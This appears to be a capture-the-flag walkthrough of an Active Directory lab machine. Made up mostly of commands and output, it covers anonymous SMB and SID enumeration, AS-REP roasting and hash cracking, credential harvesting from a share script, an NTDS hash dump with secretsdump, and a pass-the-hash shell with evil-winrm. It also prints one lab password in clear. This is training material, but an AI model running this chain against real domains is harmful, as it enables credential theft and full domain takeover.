# VulnNet: Roasted

## Enumeration using nmap
<pre>nmap -sV -sC 10.10.227.72 -Pn

Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-21 20:26:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-21T20:26:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.99 seconds</pre>

- Port 139 + 445 is open

## Enum4Linux
<pre>enum4linux 10.10.227.72  
Domain Name:VULNNET-RST                                                                                                                           Domain Sid: S-1-5-21-1589833671-435344116-4136949213</pre>

## SMB Enumeration
- Port 139 + 445 is open
- Use `smbclient` to enumerate shares

<pre>smbmap -H 10.10.227.72 -u anonymous

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.227.72:445        Name: 10.10.227.72              Status: Guest session   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing</pre>

- Read access to the IPC$ share as `anonymous`
- We are able to list domain users using `lookupsid.py`

## lookupsid.py
- Brute forcing of Windows SIDs to identify users.groups on the target

https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers  

<pre>sudo lookupsid.py anonymous@10.10.227.72

[sudo] password for kali: 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.227.72
[*] StringBinding ncacn_np:10.10.227.72[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)</pre>

We have discovered the following user accounts:
Administrator  
Guest  
krbtgt  
WIN-2BO8M1OE1M1$  
enterprise-core-vn  
a-whitehat  
t-skid  
j-goldenhand  
j-leet  

### AS-REP Roasting
AS-REP Roasting occurs when a user account has the privilege "Does not require pre-authentication" in Active Directory.  

This means that the account does not need to provide identification before requesting a Kerberos ticket on the user account.

- Use GetNPUsers.py
- Query AS-REP Roastable accounts from Key Distribution Centre using usernames we discovered stored in users.txt  

<pre>GetNPUsers.py VULNNET-RST.local/ -no-pass -usersfile /home/kali/Documents/VulnNet_Roast/users.txt -dc-ip 10.10.227.72
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8a24fbdc2cc549621c14d12a525046e4$74c507233131c5f1c3e8cb7ff409ebaac2abe9c3aa1b9bfb9e652e0bfe1a9580c731a68d652b4ffa2b27211a9a2d8db205fa5fac1690e1d3cf9752cff2e93e21e79ae056c22cafe1d06fa065a4009424e05a60605ed2de250565265ea6c60c4898963f5ab4454c5b5959a048fc56e4be25d6627f46d3bdec2d2aa49de9d3d0781f30d57855f6aa23eb733c59c5d824bb6b546e938a865964349d3aab414ed1a6f21dd68ceab6e7e81c75695bb5954dbfb901459b4ee839775f92c6f48a9fb92c78feb0a1e96b7dba8dda09d45b705aaadd4009d51bbb6a762eae59e8bc01147c84f9894e03bfbaafbf317170fbb249052be02aefa392
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set</pre>

Discovered a hash for user account `t-skid`  

Hash is displayed as `Kerberos 5, etype 23, AS-REP`  

- Crack the hash using Hashcat
<pre>hashcat -m 18200 /home/kali/Documents/VulnNet_Roast/TGT_ticket.txt /usr/share/wordlists/rockyou.txt</pre>

We now have cracked the password for user account `t-skid`

## Enumerate + Connect to SMB using t-skid account
- Enumerate the shares we can access
<pre>smbmap -H 10.10.227.72 -u t-skid -p '*****'</pre>

- As the Anonymous account earlier, we couldn't access NETLOGON
- Connect to NETLOGON share

<pre>smbclient \\\\10.10.227.72\\NETLOGON -U t-skid
Password for [WORKGROUP\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)</pre>

- Discovered credentials in the .vbs script

strUserNTName = "a-whitehat"  
strPassword = "*********"

## Dump NTDS.dit
- Check if user `a-whitehat` has the privilege to dump hashes 

<pre>secretsdump.py vulnnet-rst/a-whitehat:'bNdKVkjv3RR9ht'@10.10.227.72

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
</pre>

## Evil-WinRM
- Ultimate shell for hacking/pentesting

<pre>evil-winrm -i 10.10.227.72 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d</pre>
